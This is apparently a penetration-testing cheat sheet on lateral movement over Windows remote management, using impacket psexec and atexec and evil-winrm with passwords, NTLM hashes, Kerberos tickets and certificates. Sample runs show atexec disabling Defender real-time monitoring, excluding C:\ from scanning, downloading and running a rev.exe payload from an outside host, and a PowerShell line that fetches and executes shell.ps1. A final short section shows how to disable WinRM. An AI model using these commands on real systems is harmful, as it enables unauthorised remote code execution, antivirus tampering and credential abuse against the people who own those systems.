---
title: "WinRM"
tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "WinRM", "PsExec", "AtExec", "Remote Management"]
---

{{< filter_buttons >}}

### PsExec - Interactive Shell

#### Domain

```console {class="password"}
# Password
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

```console {class="ntlm"}
# NTLM
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> -k
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> -k
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -k -no-pass
```

#### Local auth

```console {class="password"}
# Password
impacket-psexec '<USER>:<PASSWORD>@<TARGET>'
```

```console {class="ntlm"}
# NTLM
impacket-psexec '<USER>@<TARGET> -hashes :<HASH>
```

---

### AtExec - Run Immediate Scheduled Task

#### Domain

```console {class="password"}
# Password
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> 'powershell.exe -c "<CMD>"'
```

```console {class="ntlm"}
# NTLM
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> 'powershell.exe -c "<CMD>"'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> -k 'powershell.exe -c "<CMD>"'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> -k 'powershell.exe -c "<CMD>"'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -k 'powershell.exe -c "<CMD>"'
```

#### Local Auth

```console {class="password"}
# Password
impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET> 'powershell.exe -c "<CMD>"'
```

```console {class=sample-code}
impacket-atexec 'WORKGROUP/test:test@192.168.10.2' 'powershell.exe -c "iex(iwr http://192.168.10.1:8443/shell.ps1 -UseBasicParsing)"'
```

```console {class="ntlm"}
# NTLM
impacket-atexec '<WORKGROUP>/<USER>@<TARGET> -hashes :<HASH> 'powershell.exe -c "<CMD>"'
```

```console {class=sample-code}
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \gNBJCrJi
[*] Running task \gNBJCrJi
[*] Deleting task \gNBJCrJi
[*] Attempting to read ADMIN$\Temp\gNBJCrJi.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -ExclusionPath C:\\"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \cbUEDAaz
[*] Running task \cbUEDAaz
[*] Deleting task \cbUEDAaz
[*] Attempting to read ADMIN$\Temp\cbUEDAaz.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "iwr 10.8.7.13:8443/rev.exe -outfile C:\programdata\rev.exe"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \RmSAvink
[*] Running task \RmSAvink
[*] Deleting task \RmSAvink
[*] Attempting to read ADMIN$\Temp\RmSAvink.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "C:\programdata\rev.exe"' 
 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \LCpKICMQ
[*] Running task \LCpKICMQ
[*] Deleting task \LCpKICMQ
[*] Attempting to read ADMIN$\Temp\LCpKICMQ.tmp
```

---

### evil-winrm-py

{{< tab set3 tab1 >}}Password{{< /tab >}}
{{< tab set3 tab2 >}}NTLM{{< /tab >}}
{{< tab set3 tab3 >}}Kerberos{{< /tab >}}
{{< tab set3 tab4 >}}Cert{{< /tab >}}
{{< tab set3 tab5 >}}SSL{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
evil-winrm-py -i <TARGET> -u '<USER>' -p '<PASSWORD>'
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
evil-winrm-py -i <TARGET> -u '<USER>' -H '<HASH>'
```

{{< /tabcontent >}}
{{< tabcontent set3 tab3 >}}

```console
# Step 1: Configure '/etc/krb5.conf' (All in UPPERCASE)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HOPE.WINDCORP.HTB:88
        admin_server = HOPE.WINDCORP.HTB
        default_domain = WINDCORP.HTB
    }
    
[domain_realm]
    .domain.internal = WINDCORP.HTB
    domain.internal = WINDCORP.HTB
```

```console
# Step 2: Request a ticket
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# Step 3: Pass-the-ticket
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
# Step 4: Connect
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -k --no-pass
```

```console
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -p '<PASSWORD>' -k
```

{{< /tabcontent >}}
{{< tabcontent set3 tab4 >}}

```console
evil-winrm-py -i <TARGET> -u '<USER>' --priv-key-pem <PRIV_KEY_PEM> --cert-pem <CERT_PEM>
```

{{< /tabcontent >}}
{{< tabcontent set3 tab5 >}}

```console
# Port 5986 SSL
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -k --no-pass --ssl
```

{{< /tabcontent >}}

---

### evil-winrm

{{< tab set4 tab1 >}}Password{{< /tab >}}
{{< tab set4 tab2 >}}NTLM{{< /tab >}}
{{< tab set4 tab3 >}}Kerberos{{< /tab >}}
{{< tab set4 tab4 >}}Cert{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'
```

```console {class=sample-code}
$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents>
```

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

```console
evil-winrm -i <TARGET> -u '<USER>' -H <HASH> 
```

{{< /tabcontent >}}
{{< tabcontent set4 tab3 >}}

```console
# Step 1: Configure '/etc/krb5.conf' (All in UPPERCASE)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HOPE.WINDCORP.HTB:88
        admin_server = HOPE.WINDCORP.HTB
        default_domain = WINDCORP.HTB
    }
    
[domain_realm]
    .domain.internal = WINDCORP.HTB
    domain.internal = WINDCORP.HTB
```

```console
# Step 2: Request a ticket
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# Step 3: Pass-the-ticket
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
# Step 4: Connect
sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET> -r <DOMAIN>
```

```console {class="sample-code"}
$ evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

{{< /tabcontent >}}
{{< tabcontent set4 tab4 >}}

```console
evil-winrm -i <TARGET> -S -k <KEY> -c <CRT>
```

{{< /tabcontent >}}

---

### Disable WinRM

```console
Disable-PSRemoting -Force
```

```console
Stop-Service WinRM -PassThru
```

```console
Set-Service WinRM -StartupType Disabled -PassThru
```